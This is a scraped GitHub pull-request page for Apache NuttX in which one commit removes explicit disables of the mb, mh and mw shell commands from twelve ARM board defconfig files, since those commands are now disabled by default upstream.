    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fapache%2Fnuttx%2Fpull%2F3292%2Fcommits%2F016873788280ca815ba886195535bbe601de6e48)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fpull_requests%2Fshow%2Fcommits&source=header-repo&source_repo=apache%2Fnuttx)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[apache](/apache)
/
**[nuttx](/apache/nuttx)**
Public

* [Notifications](/login?return_to=%2Fapache%2Fnuttx) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fapache%2Fnuttx)
* [Star
   3k](/login?return_to=%2Fapache%2Fnuttx)

* [Code](/apache/nuttx)
* [Issues
  470](/apache/nuttx/issues)
* [Pull requests
  98](/apache/nuttx/pulls)
* [Actions](/apache/nuttx/actions)
* [Projects
  0](/apache/nuttx/projects)
* [Security](/apache/nuttx/security)
* [Insights](/apache/nuttx/pulse)

Additional navigation options

* [Code](/apache/nuttx)
* [Issues](/apache/nuttx/issues)
* [Pull requests](/apache/nuttx/pulls)
* [Actions](/apache/nuttx/actions)
* [Projects](/apache/nuttx/projects)
* [Security](/apache/nuttx/security)
* [Insights](/apache/nuttx/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fapache%2Fnuttx%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fapache%2Fnuttx%2Fissues%2Fnew%2Fchoose)
to your account

# boards/\*\*/defconfig: Remove explict disables for mb, mh, and mw #3292

 Merged

[xiaoxiang781216](/xiaoxiang781216)
merged 1 commit into
[apache:master](/apache/nuttx/tree/master "apache/nuttx:master")
from
swkim101:master

Apr 3, 2021

[Conversation
0](/apache/nuttx/pull/3292)
[Commits
1](/apache/nuttx/pull/3292/commits)
[Checks
0](/apache/nuttx/pull/3292/checks)
[Files changed](/apache/nuttx/pull/3292/files)

 Merged

# [boards/\*\*/defconfig: Remove explict disables for mb, mh, and mw](#top) #3292

 Show file tree

 Hide file tree

 Changes from **all commits**

Commits

[Show all changes

1 commit](/apache/nuttx/pull/3292/files)
Select commit

[`0168737`
boards/\*\*/defconfig: Remove explict disables for mb, mh, and mw

swkim101 Apr 3, 2021](/apache/nuttx/pull/3292/commits/016873788280ca815ba886195535bbe601de6e48)

**File filter**

### Filter by extension

Filter by extension

No extension
(12)

All 1 file type selected

---

Viewed files

[Clear filters](/apache/nuttx/pull/3292/commits/016873788280ca815ba886195535bbe601de6e48)

 **Conversations**

Failed to load comments.  Retry

 Loading

 **Jump to**

Jump to file

Failed to load files.  Retry

 Loading

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

Show whitespace

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

* boards/arm

  + lc823450/lc823450-xgevk/configs

    - audio

      * boards/arm/lc823450/lc823450-xgevk/configs/audio/defconfig
        [defconfig](#diff-abeab9b3194e0611a295d2fa964bf60dc74a60f4efc15ff3c0586efe5ebfaf05)
    - bt

      * boards/arm/lc823450/lc823450-xgevk/configs/bt/defconfig
        [defconfig](#diff-ce010a3a62d08f112eebb6522fb6293275656e66ef690cb2429e1a976ffd0704)
    - knsh

      * boards/arm/lc823450/lc823450-xgevk/configs/knsh/defconfig
        [defconfig](#diff-923e7ba97cceecdc9d566454962a3d74084215bbc4bc539631fe3837e9d30622)
    - krndis

      * boards/arm/lc823450/lc823450-xgevk/configs/krndis/defconfig
        [defconfig](#diff-59b95b3b952139cc99ef1ae10e54b22ed6514c0b07e9c6e0164c1e0820e32209)
    - nsh

      * boards/arm/lc823450/lc823450-xgevk/configs/nsh/defconfig
        [defconfig](#diff-6f890e996c6dab763b7a1efc1cd555b191dcd60c4b695ef72b242120c7cf2c8a)
    - usb

      * boards/arm/lc823450/lc823450-xgevk/configs/usb/defconfig
        [defconfig](#diff-c5d1aea29c69d28719b757c99dd96c68f456aa0e24fb1b0f58c73ad0c5031bb5)
  + stm32

    - nucleo-f302r8/configs/nsh

      * boards/arm/stm32/nucleo-f302r8/configs/nsh/defconfig
        [defconfig](#diff-657f87a48a41ac4d336ead77823d0e062ef0b21ff402f140fa237dfce860639c)
    - nucleo-f334r8/configs

      * adc

        + boards/arm/stm32/nucleo-f334r8/configs/adc/defconfig
          [defconfig](#diff-51eb7b00f352f4f82adc322eb4fca96b424be32729b4523a8614fb1eab3a4f71)
      * nsh

        + boards/arm/stm32/nucleo-f334r8/configs/nsh/defconfig
          [defconfig](#diff-56c38c922736e631cd18c2d34a9ba6427a36f5736b0730fe9315fa1a7e5cd907)
    - stm32f334-disco/configs

      * buckboost

        + boards/arm/stm32/stm32f334-disco/configs/buckboost/defconfig
          [defconfig](#diff-6d07758e9b211900bbe462c3189b1420fab6c6639f5a930888cfea653955fdef)
      * nsh

        + boards/arm/stm32/stm32f334-disco/configs/nsh/defconfig
          [defconfig](#diff-e1e3488618de16ecf715cb0def12edccb4a020e4c8a354a7a73cfc9a97e7c3a9)
      * powerled

        + boards/arm/stm32/stm32f334-disco/configs/powerled/defconfig
          [defconfig](#diff-70ccd80f85ed59814248ea37f76e11a6ddc7d1395913268f198cba792099689f)

boards/\*\*/defconfig: Remove explict disables for mb, mh, and mw

```
Since [apache/nuttx-apps#647](https://github.com/apache/nuttx-apps/pull/647) disables
them by default.
See:
- [#3011](https://github.com/apache/nuttx/issues/3011)
-
[apache/nuttx-apps#647 (comment)](https://github.com/apache/nuttx-apps/pull/647#issuecomment-812818855)

Co-authored-by: Gisu Yeo <wcharcode@gmail.com>
Co-authored-by: Taegyu Kim <tgkim@purdue.edu>
```

* Loading branch information

[![@swkim101](https://avatars.githubusercontent.com/u/72803908?s=40&v=4)](/swkim101) [![@GisuYeo](https://avatars.githubusercontent.com/u/33445425?s=40&v=4)](/GisuYeo) [![@ktskt](https://avatars.githubusercontent.com/u/45827896?s=40&v=4)](/ktskt)

3 people

committed
Apr 3, 2021

commit 016873788280ca815ba886195535bbe601de6e48

## There are no files selected for viewing

2 changes: 0 additions & 2 deletions

2
[boards/arm/lc823450/lc823450-xgevk/configs/audio/defconfig](#diff-abeab9b3194e0611a295d2fa964bf60dc74a60f4efc15ff3c0586efe5ebfaf05 "boards/arm/lc823450/lc823450-xgevk/configs/audio/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/lc823450/lc823450-xgevk/configs/audio/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -79,8 +79,6 @@ CONFIG\_NSH\_DISABLE\_DIRNAME=y |
|  |  | CONFIG\_NSH\_DISABLE\_EXEC=y |
|  |  | CONFIG\_NSH\_DISABLE\_GET=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
| Expand Down | |  |

2 changes: 0 additions & 2 deletions

2
[boards/arm/lc823450/lc823450-xgevk/configs/bt/defconfig](#diff-ce010a3a62d08f112eebb6522fb6293275656e66ef690cb2429e1a976ffd0704 "boards/arm/lc823450/lc823450-xgevk/configs/bt/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/lc823450/lc823450-xgevk/configs/bt/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -112,8 +112,6 @@ CONFIG\_NSH\_DISABLE\_DIRNAME=y |
|  |  | CONFIG\_NSH\_DISABLE\_EXEC=y |
|  |  | CONFIG\_NSH\_DISABLE\_GET=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
| Expand Down | |  |

2 changes: 0 additions & 2 deletions

2
[boards/arm/lc823450/lc823450-xgevk/configs/knsh/defconfig](#diff-923e7ba97cceecdc9d566454962a3d74084215bbc4bc539631fe3837e9d30622 "boards/arm/lc823450/lc823450-xgevk/configs/knsh/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/lc823450/lc823450-xgevk/configs/knsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -62,9 +62,7 @@ CONFIG\_NSH\_DISABLE\_GET=y |
|  |  | CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MD5=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKDIR=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
| Expand Down | |  |

2 changes: 0 additions & 2 deletions

2
[boards/arm/lc823450/lc823450-xgevk/configs/krndis/defconfig](#diff-59b95b3b952139cc99ef1ae10e54b22ed6514c0b07e9c6e0164c1e0820e32209 "boards/arm/lc823450/lc823450-xgevk/configs/krndis/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/lc823450/lc823450-xgevk/configs/krndis/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -115,8 +115,6 @@ CONFIG\_NSH\_DISABLE\_DIRNAME=y |
|  |  | CONFIG\_NSH\_DISABLE\_EXEC=y |
|  |  | CONFIG\_NSH\_DISABLE\_GET=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
| Expand Down | |  |

2 changes: 0 additions & 2 deletions

2
[boards/arm/lc823450/lc823450-xgevk/configs/nsh/defconfig](#diff-6f890e996c6dab763b7a1efc1cd555b191dcd60c4b695ef72b242120c7cf2c8a "boards/arm/lc823450/lc823450-xgevk/configs/nsh/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/lc823450/lc823450-xgevk/configs/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -68,9 +68,7 @@ CONFIG\_NSH\_DISABLE\_GET=y |
|  |  | CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MD5=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKDIR=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
| Expand Down | |  |

2 changes: 0 additions & 2 deletions

2
[boards/arm/lc823450/lc823450-xgevk/configs/usb/defconfig](#diff-c5d1aea29c69d28719b757c99dd96c68f456aa0e24fb1b0f58c73ad0c5031bb5 "boards/arm/lc823450/lc823450-xgevk/configs/usb/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/lc823450/lc823450-xgevk/configs/usb/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -75,9 +75,7 @@ CONFIG\_NSH\_DISABLE\_GET=y |
|  |  | CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MD5=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKFIFO=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
| Expand Down | |  |

3 changes: 0 additions & 3 deletions

3
[boards/arm/stm32/nucleo-f302r8/configs/nsh/defconfig](#diff-657f87a48a41ac4d336ead77823d0e062ef0b21ff402f140fa237dfce860639c "boards/arm/stm32/nucleo-f302r8/configs/nsh/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/stm32/nucleo-f302r8/configs/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -46,13 +46,10 @@ CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_KILL=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_LS=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKDIR=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MOUNT=y |
|  |  | CONFIG\_NSH\_DISABLE\_MV=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_PWD=y |
|  |  | CONFIG\_NSH\_DISABLE\_RM=y |
| Expand Down | |  |

3 changes: 0 additions & 3 deletions

3
[boards/arm/stm32/nucleo-f334r8/configs/adc/defconfig](#diff-51eb7b00f352f4f82adc322eb4fca96b424be32729b4523a8614fb1eab3a4f71 "boards/arm/stm32/nucleo-f334r8/configs/adc/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/stm32/nucleo-f334r8/configs/adc/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -49,13 +49,10 @@ CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_KILL=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_LS=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKDIR=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MOUNT=y |
|  |  | CONFIG\_NSH\_DISABLE\_MV=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_PWD=y |
|  |  | CONFIG\_NSH\_DISABLE\_RM=y |
| Expand Down | |  |

3 changes: 0 additions & 3 deletions

3
[boards/arm/stm32/nucleo-f334r8/configs/nsh/defconfig](#diff-56c38c922736e631cd18c2d34a9ba6427a36f5736b0730fe9315fa1a7e5cd907 "boards/arm/stm32/nucleo-f334r8/configs/nsh/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/stm32/nucleo-f334r8/configs/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -46,13 +46,10 @@ CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_KILL=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_LS=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKDIR=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MOUNT=y |
|  |  | CONFIG\_NSH\_DISABLE\_MV=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_PWD=y |
|  |  | CONFIG\_NSH\_DISABLE\_RM=y |
| Expand Down | |  |

3 changes: 0 additions & 3 deletions

3
[boards/arm/stm32/stm32f334-disco/configs/buckboost/defconfig](#diff-6d07758e9b211900bbe462c3189b1420fab6c6639f5a930888cfea653955fdef "boards/arm/stm32/stm32f334-disco/configs/buckboost/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/stm32/stm32f334-disco/configs/buckboost/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -62,13 +62,10 @@ CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_KILL=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_LS=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKDIR=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MOUNT=y |
|  |  | CONFIG\_NSH\_DISABLE\_MV=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_PWD=y |
|  |  | CONFIG\_NSH\_DISABLE\_RM=y |
| Expand Down | |  |

3 changes: 0 additions & 3 deletions

3
[boards/arm/stm32/stm32f334-disco/configs/nsh/defconfig](#diff-e1e3488618de16ecf715cb0def12edccb4a020e4c8a354a7a73cfc9a97e7c3a9 "boards/arm/stm32/stm32f334-disco/configs/nsh/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/stm32/stm32f334-disco/configs/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -48,13 +48,10 @@ CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_KILL=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_LS=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKDIR=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MOUNT=y |
|  |  | CONFIG\_NSH\_DISABLE\_MV=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_PWD=y |
|  |  | CONFIG\_NSH\_DISABLE\_RM=y |
| Expand Down | |  |

3 changes: 0 additions & 3 deletions

3
[boards/arm/stm32/stm32f334-disco/configs/powerled/defconfig](#diff-70ccd80f85ed59814248ea37f76e11a6ddc7d1395913268f198cba792099689f "boards/arm/stm32/stm32f334-disco/configs/powerled/defconfig")

Show comments

[View file](/apache/nuttx/blob/016873788280ca815ba886195535bbe601de6e48/boards/arm/stm32/stm32f334-disco/configs/powerled/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -54,13 +54,10 @@ CONFIG\_NSH\_DISABLE\_GET=y |
|  |  | CONFIG\_NSH\_DISABLE\_HEXDUMP=y |
|  |  | CONFIG\_NSH\_DISABLE\_KILL=y |
|  |  | CONFIG\_NSH\_DISABLE\_LOSETUP=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKDIR=y |
|  |  | CONFIG\_NSH\_DISABLE\_MKRD=y |
|  |  | CONFIG\_NSH\_DISABLE\_MOUNT=y |
|  |  | CONFIG\_NSH\_DISABLE\_MV=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_PUT=y |
|  |  | CONFIG\_NSH\_DISABLE\_PWD=y |
|  |  | CONFIG\_NSH\_DISABLE\_RM=y |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_4e18fff7_20250114_204339.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fapache%2Fnuttx-apps%2Fpull%2F647%2Fcommits%2F2fc1157f8585acc39f13a31612ebf890f41e76ca)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
